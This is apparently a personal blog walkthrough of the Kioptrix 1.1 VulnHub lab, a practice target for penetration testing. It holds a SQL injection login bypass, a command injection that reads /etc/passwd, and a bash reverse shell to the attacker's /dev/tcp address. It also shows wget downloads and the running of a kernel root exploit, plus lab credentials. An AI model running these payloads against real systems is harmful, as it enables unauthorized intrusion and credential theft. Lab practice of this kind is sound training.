+++
title = "Kioptrix 1.1"
date = 2019-02-01
[taxonomies]
tags = ["vulnhub"]
+++

1. Ran `netdiscover` to discover the IP address of the machine.

2. Used nmap TCP scan:

	```bash
	nmap -vv -Pn -A -sS -T4 -p- -oN /root/tcpscan.txt 192.168.225.132
	```

3. Used nmap UDP scan:

	```bash
	nmap -vv -Pn -A -sU -T4 -p- -oN /root/udpscan.txt 192.168.225.132
	```

4. Used Firefox to navigate to port 80 and found a form asking for username and password.

5. Started enumeration process:

	```bash
	dirb http://192.168.225.132
	```

	```bash
	nikto -h 192.168.225.132
	```

	Used SQL injection bypass cheat sheet and successfully bypassed the form using:

	```bash
	admin' or '1'='1
	```

	[https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

6. Found another form that contains a ping tool. Used command injection to successfully run another command using:

	```bash
	google.ca;cat /etc/passwd
	```

7. Getting shell access by refining the command injection - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

	Setup netcat on Kali:

	```bash
	nc -nvlp 8080
	```

	Execute the command injection from browser:
	
	```bash
	localhost;bash -i >& /dev/tcp/10.242.2.3/8080 0>&1
	```

8. Check account privileges - [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)

	```bash
	wget 10.242.2.3/linuxprivchecker.py
	```

	```bash
	./linuxprivchecker.py
	```

9. **FAIL** - I got side tracked by trying to somehow edit the writable logwatcher cronjob with 777 permissions.

10. I dug around the system to see if I could find simple passwords.

	Found password for MySQL user account `john:hiroshima` inside `index.php`.

11. Investigated the MySQL databases using john's account.

	Found password for user account `root:hiroshima` account for MySQL. This was a fluke find as the hashes for John and Root account were the same.

12. **FAIL** - Somehow I got the idea that I could try and escape to a root shell account from the MySQL command line

	```bash
	!\ bash
	```

13. After thinking hard about what to do next, I finally resorted to linux kernel 2.6.9 exploit - [https://www.exploit-db.com/exploits/9479](https://www.exploit-db.com/exploits/9479)

	```bash
	wget 10.242.2.3/9479.c
	```

	```bash
	gcc 9479.c
	```

	```bash
	./a.out
	```

14. ROOTED MY FIRST BOX!

### Today I learned
```bash
python -m SimpleHTTPServer 80
```

```bash
php -S localhost:80
```

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

* You can run shell commands in the MySQL command line.

### Improvement for next time

* Keep your enumeration scripts and any files you need to transfer between machines using `/var/www/html`. It will save time to always run python or php HTTP server. Remember to execute:

```bash
service apache2 start
```

* If you get baited into trying to modify full permission files/folders, do a quick simple test to see if you can edit the file/folder first.

* Taking notes as I go. This is an ongoing process and I feel like I know where I could do better.
